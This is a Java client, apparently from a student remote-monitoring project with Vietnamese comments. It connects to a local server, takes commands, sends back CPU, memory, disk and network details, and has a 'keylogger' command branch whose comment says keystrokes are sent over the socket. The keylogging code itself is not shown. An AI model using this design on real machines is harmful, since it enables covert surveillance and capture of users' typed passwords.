package Controller;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.PrintWriter;
import java.net.Socket;

public class User {
    
    public static void main(String[] args) {
        String serverAddress = "127.0.0.2"; // Địa chỉ IP của máy chủ
        int portNumber = 5254; // Cổng lắng nghe của máy chủ

        try (
            Socket socket = new Socket(serverAddress, portNumber);
            PrintWriter out = new PrintWriter(socket.getOutputStream(), true);
            BufferedReader in = new BufferedReader(new InputStreamReader(socket.getInputStream()))
        ) {
            // Gửi thông báo USER tới server
            out.println("USER");

            // Đối tượng để lấy thông tin hệ thống
            SystemInformation systeminfo = new SystemInformation();

            String serverCommand;
            while ((serverCommand = in.readLine()) != null) {
                System.out.println("Command from server: " + serverCommand);
                if ("information".equals(serverCommand)) {         
                    StringBuilder info = new StringBuilder(); 
                        info.append("CPU Info: ").append(systeminfo.getCpuInfo()).append("\n");
                        info.append("Memory Info: ").append(systeminfo.getMemoryInfo()).append("\n");
                        info.append("Disk Info: ").append(systeminfo.getDiskInfo()).append("\n");
                        info.append("Network Info: ").append(systeminfo.getNetworkInfo()).append("\n"); 
                    String[] infoLines = info.toString().split("\n");
                    for (String line : infoLines) {
                        out.println("INFO:" + line);
                    }                 
                  } else if ("keylogger".equals(serverCommand)) {
                    // KeyLogger sẽ tự động gửi sự kiện phím qua PrintWriter
                    // Không cần xử lý gì thêm ở đây
                }
            }
        } catch (IOException e) {
            System.err.println("Error: " + e.getMessage());
        }
    }
}